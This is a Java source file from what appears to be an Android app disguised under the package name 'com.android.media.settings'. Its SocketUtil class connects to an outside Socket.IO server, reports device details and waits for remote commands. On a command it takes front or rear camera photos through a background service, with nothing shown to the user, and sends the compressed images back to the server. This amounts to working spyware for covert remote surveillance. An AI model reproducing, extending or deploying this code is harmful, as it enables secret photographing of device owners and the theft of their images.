package com.android.media.settings.Utility;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.hardware.Camera;
import android.os.Build;
import android.os.Handler;
import android.support.v4.content.LocalBroadcastManager;
import android.util.Base64;
import android.util.Log;

import com.android.media.settings.Interface.ImageCaptureListener;
import com.android.media.settings.Model.DeviceActivity;
import com.android.media.settings.Model.DeviceActivityResponse;
import com.android.media.settings.Model.Media;
import com.android.media.settings.Model.Device;
import com.android.media.settings.Service.CameraService;
import com.android.media.settings.Service.ImageCaptureService;
import com.android.media.settings.Service.ImageCaptureServiceImp;
import com.github.nkzawa.emitter.Emitter;
import com.github.nkzawa.socketio.client.IO;
import com.github.nkzawa.socketio.client.Socket;
import com.google.gson.Gson;

import java.io.UnsupportedEncodingException;
import java.net.URISyntaxException;
import java.net.URLEncoder;
import java.util.TreeMap;

public class SocketUtil {
    private static final String TAG = SocketUtil.class.getSimpleName();

    private static final String EVENT_JOIN = "join";
    private static final String EVENT_ON_ACTIVITY = "onActivity";
    private static final String EVENT_ACTIVITY_RESPONSE = "activityResponse";

    public static final String ACTIVITY_SNAP_FRONT = "snapFront";
    public static final String ACTIVITY_SNAP_REAR = "snapRear";
    public static final String ACTIVITY_SNAP = "userSnap";

    private static Socket mSocket;
    private Context context;
    private Handler handler;
    private MediaUtility mMediaUtility;
    private String deviceId;

    public SocketUtil(Context context) {
        this.context = context;
        handler = new Handler();
        mMediaUtility = MediaUtility.getInstance(context);

        LocalBroadcastManager.getInstance(context).registerReceiver(receiver, new IntentFilter("CamServiceUpdates"));
    }

    private void runOnUiThread(Runnable runnable) {
        handler.post(runnable);
    }

    public void connect() {
        Log.d(TAG, "Connecting to Server...");
        try {
            mSocket = IO.socket("https://media-store.herokuapp.com/");
        } catch (URISyntaxException e) { e.printStackTrace(); }
        mSocket.on(Socket.EVENT_CONNECT, onConnect);
        mSocket.on(Socket.EVENT_CONNECT_ERROR, onError);
        mSocket.on(Socket.EVENT_CONNECT_TIMEOUT, onError);
        mSocket.on(EVENT_ON_ACTIVITY, onActivity);
        mSocket.connect();
    }

    private Emitter.Listener onConnect = (Object... args) -> {
        Log.d(TAG, "Device Connected");
        String response = mMediaUtility.toJson(mMediaUtility.getDevice());
        try {
            response = URLEncoder.encode(response, "utf-8");
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
        mSocket.emit(EVENT_JOIN, response);
    };

    private Emitter.Listener onError = (Object... args) -> {
        Device device = MediaUtility.getInstance(context).getDevice();
        mSocket.emit(EVENT_JOIN, device);
    };

    private Emitter.Listener onActivity = (Object... args) -> {
        Object obj = args[0];
        Log.d(TAG, obj.toString());
        DeviceActivity activity = DeviceActivity.fromJson(obj.toString());
        deviceId = activity.getDeviceId();
        processActivity(activity);
    };

    private void captureImage(int cameraId, int rotation) {
        if(!CameraUtility.isCameraExist(context)) {
            return;
        }

        if(CameraUtility.isCameraExist(cameraId)) {
            CameraService.takeSnap(context, cameraId, CameraService.FUNCTION_TAKE_SNAP, rotation);
        } else if(CameraUtility.isCameraExist(Camera.CameraInfo.CAMERA_FACING_BACK)) {
            CameraService.takeSnap(context, Camera.CameraInfo.CAMERA_FACING_BACK,
                    CameraService.FUNCTION_TAKE_SNAP, 90);
        }
    }

    private void processActivity(DeviceActivity activity) {
        switch (activity.getName()) {
            case ACTIVITY_SNAP:
                captureImage(Camera.CameraInfo.CAMERA_FACING_FRONT, 270);
                break;

            case ACTIVITY_SNAP_FRONT:
                captureImage(Camera.CameraInfo.CAMERA_FACING_FRONT, 270);
                break;

            case ACTIVITY_SNAP_REAR:
                captureImage(Camera.CameraInfo.CAMERA_FACING_BACK, 90);
                break;
        }
    }

    private void emitImage(String byteString) {
        Media media = new Media(byteString);
        DeviceActivityResponse response = new DeviceActivityResponse(ACTIVITY_SNAP, deviceId, media);
        mSocket.emit(EVENT_ACTIVITY_RESPONSE, new Gson().toJson(response));
    }

    BroadcastReceiver receiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            byte[] bytes = intent.getByteArrayExtra("ImageBytes");
            emitImage(mMediaUtility.compressByteImage(bytes));
        }
    };
}
